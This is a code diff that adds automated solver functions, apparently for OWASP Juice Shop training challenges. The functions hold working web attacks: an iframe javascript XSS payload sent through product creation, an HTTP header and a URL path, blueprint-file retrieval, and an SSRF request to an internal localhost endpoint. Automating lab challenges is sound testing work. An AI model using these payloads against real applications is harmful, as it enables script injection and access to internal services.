@@ -523,6 +523,64 @@ def s_multiple_likes(sess: Session):
     return last in (200, 201)
 
 
+_XSS = '<iframe src="javascript:alert(`xss`)">'
+
+
+def s_retrieve_blueprint(sess: Session):
+    for path in ("/assets/public/images/products/JuiceShop.stl",
+                 "/assets/public/images/products/3d_keychain.stl"):
+        st, _ = sess.req("GET", path)
+        if st == 200:
+            return True
+    return False
+
+
+def s_api_only_xss(sess: Session):
+    """API-only XSS — payload iframe persisté via création produit (admin)."""
+    tok, _ = sess.admin_session()
+    if not tok:
+        return False
+    st, txt = sess.req("POST", "/api/Products",
+                       headers={"Authorization": f"Bearer {tok}"},
+                       data={"name": _XSS, "description": _XSS, "price": 47})
+    if st in (200, 201):
+        return True
+    # repli : mise à jour d'un produit existant
+    st2, _ = sess.req("PUT", "/api/Products/9",
+                      headers={"Authorization": f"Bearer {tok}"},
+                      data={"description": _XSS})
+    return st2 in (200, 201)
+
+
+def s_http_header_xss(sess: Session):
+    """HTTP-Header XSS — payload via l'en-tête True-Client-IP."""
+    tok, _ = sess.admin_session()
+    st, _ = sess.req("GET", "/rest/saveLoginIp",
+                     headers={"Authorization": f"Bearer {tok}" if tok else "",
+                              "True-Client-IP": _XSS})
+    return st in (200, 204, 500)
+
+
+def s_reflected_xss(sess: Session):
+    payload = urllib.parse.quote(_XSS, safe="")
+    st, _ = sess.req("GET", f"/rest/track-order/{payload}")
+    return st in (200, 400, 500)
+
+
+def s_ssrf(sess: Session):
+    """SSRF — image de profil pointant vers une ressource interne."""
+    tok, _ = sess.admin_session()
+    if not tok:
+        return False
+    internal = "http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0w"
+    st, _ = sess.req("POST", "/profile/image/url",
+                     headers={"Content-Type": "application/x-www-form-urlencoded",
+                              "Authorization": f"Bearer {tok}"},
+                     cookies={"token": tok},
+                     data=f"imageUrl={urllib.parse.quote(internal)}", raw=True)
+    return st in (200, 302, 500)
+
+
 SOLVERS: list[tuple[str, Callable[[Session], bool]]] = [
     ("Login Admin", s_login_admin),
     ("Login Bender", s_login_bender),
@@ -573,6 +631,11 @@ SOLVERS: list[tuple[str, Callable[[Session], bool]]] = [
     ("Upload Type", s_upload_type),
     ("Upload Size", s_upload_size),
     ("XXE Data Access", s_xxe_data_access),
+    ("Retrieve Blueprint", s_retrieve_blueprint),
+    ("API-only XSS", s_api_only_xss),
+    ("HTTP-Header XSS", s_http_header_xss),
+    ("Reflected XSS", s_reflected_xss),
+    ("SSRF", s_ssrf),
 ]
 
 
